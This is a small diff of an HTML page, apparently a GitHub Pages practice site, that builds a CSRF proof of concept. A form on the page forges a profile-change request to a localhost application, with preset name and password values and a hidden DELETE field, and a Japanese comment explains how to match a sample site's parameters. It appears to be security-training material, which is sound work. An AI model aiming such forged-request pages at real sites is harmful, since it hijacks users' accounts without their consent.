@@ -38,9 +38,10 @@
     </div>
     <div>!!!!!Github Pageにようこそ!!!!!</div>
 
-    <form action="http://localhost/profile" method="DELETE">
+    <form action="http://localhost/profile" method="POST">
         <!-- サンプルサイトのhtmlソースを見ながらIDとパスワードのパラメータ名（name）を合わせ、
         変更させたい適当な値をvalueに設定する -->
+        <input type="hidden" value="DELETE" />
         <input name="name" value="診断　亜拓" />
         <input name="password" value="hogehogehacker" />
     </form>    
